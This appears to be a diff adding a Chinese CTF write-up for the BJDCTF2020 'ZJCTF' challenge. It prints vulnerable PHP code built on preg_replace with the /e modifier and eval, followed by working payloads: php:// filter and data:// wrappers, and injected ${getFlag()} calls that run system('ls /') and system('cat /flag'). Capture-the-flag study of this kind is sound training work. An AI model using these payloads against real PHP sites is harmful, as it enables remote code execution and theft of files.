@@ -595,6 +595,59 @@ php内的" \ "在做代码执行的时候，会识别特殊字符串，绕过黑
 
 `func=\system&p=cat /tmp/flagoefiu4r93`
 
+# [BJDCTF2020]ZJCTF，不过如此 1
+
+## 知识点
+1. php伪协议
+2. preg_replace /e  代码执行漏洞
+
+## WP
+
+代码审计，GET传参，text 要为 “I have a dream”  ，file为next.php
+
+构造payload:
+
+?text=data://text/plain,I have a dream&&file=php://filter/read=convert.base64-encode/resource=next.php
+
+得到next.php源码
+
+```php
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(                                   //修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {                             //这是一个动态赋值的过程，即会将get请求中的参数名作为键$re，参数对应的值作为键值$str
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+```
+
+代码审计，要绕过正则匹配，然后执行eval()函数，而我们要执行eval()函数，就要通过getFlag()这个函数。
+
+[参考](http://www.xinyueseo.com/websecurity/158.html)
+
+\S*=${phpinfo()}
+
+将上面输入会将phpinfo()当做php代码执行。通过上述方法调用getFlag()函数
+
+payload: next.php?\S*=${getFlag()}&&cmd=phpinfo();
+
+payload: next.php?\S*=${getFlag()}&&cmd=system('ls /');
+
+payload:next.php?\S*=${getFlag()}&&cmd=system('cat /flag'); 
+
 
 
 
